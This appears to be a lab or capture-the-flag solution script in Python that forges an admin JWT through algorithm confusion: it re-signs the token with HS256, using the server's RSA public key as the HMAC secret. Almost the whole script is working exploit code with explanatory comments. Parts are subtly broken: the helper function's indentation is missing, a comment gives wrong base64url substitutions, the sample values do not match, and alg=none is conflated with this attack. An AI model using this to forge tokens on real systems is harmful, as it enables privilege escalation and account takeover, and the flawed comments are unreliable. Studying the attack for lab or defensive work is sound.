# This Script will Help you Solve the example 5 smoothly, it's very important to understand each part so all the explanation are included

import base64
import hmac
import hashlib
import json

  

# Helper: base64url encoding without padding
def b64url_encode(data):
return base64.urlsafe_b64encode(data).rstrip(b'=') #Url Encoding replaces + and / with _ and __, the strip is to manually remove the padding.

  

# Step 1: Define header and payload
header = {"alg": "HS256", "typ": "JWT"} # Nothing new here just basic content, and precise the alg
payload = {"username": "user", "admin": 1}

  

# Step 2: Encode them (We are dealing with bytes not strings)
header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode()) # json.dumps to remove extra white spaces, encode to transform the content to bytes !! 
payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode()) # .encode() because we want the output as byte note string
# header_b64 = b"eyJhbGciOiAiSFMyNTYifQ"      # bytes
# payload_b64 = b"eyJhZG1pbiI6IHRydWV9"       # bytes
  

# Step 3: Concatenate for signing
message = header_b64 + b'.' + payload_b64

  

# Step 4: Use the public key as the HMAC secret
public_key = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHSoarRoLvgAk4O41RE0w6lj2e7TDTbFk62WvIdJFo/aSLX/x9oc3PDqJ0Qu1x06/8PubQbCSLfWUyM7Dk0+irzb/VpWAurSh+hUvqQCkHmH9mrWpMqs5/L+rluglPEPhFwdL5yWk5kS7rZMZz7YaoYXwI7Ug4Es4iYbf6+UV0sudGwc3HrQ5uGUfOpmixUO0ZgTUWnrfMUpy2dFbZp7puQS6T8b5EJPpLY+iojMb/rbPB34NrvJKU1F84tfvY8xtg3HndTNPyNWp7EOsujKZIxKF5/RdW+Qf9jjBMvsbjfCo0LiNVjpotiLPVuslsEWun+LogxR+fxLiUehSBb8ip"
#
  

# Step 5: Create HMAC SHA256 signature (The Vulnerability) !!!
signature = hmac.new(public_key, message, hashlib.sha256).digest() 
signature_b64 = b64url_encode(signature)
# signature_b64 = b"VGVzdFNpZ25hdHVyZQ"       # bytes


############## Explanation: ################
# If the server accepts both RS256 and HS256:
# An attacker grabs the public key (it's public).
# They forge a token with "alg": "HS256" (instead of "RS256").
# They sign the token using the public key as if it were a shared secret (as in your line).
# The server, if misconfigured, accepts the token and validates the HMAC signature using that same public key, mistakenly thinking it's still doing asymmetric verification.
# ➡ Result: Anyone can forge tokens and become admin.
# This is called an algorithm confusion or alg=none/HS256 downgrade attack.
############################################


# Final JWT
jwt_token = b'.'.join([header_b64, payload_b64, signature_b64]).decode() # decode(): Converts the final byte string into a UTF-8 string (ASCII-compatible), because JWTs are meant to be transmitted as plain text (in headers or URLs), not as raw bytes.
  

print("[+] JWT:\n", jwt_token)
print(f"header: {header_b64}")
print(f"payload: {payload_b64}")
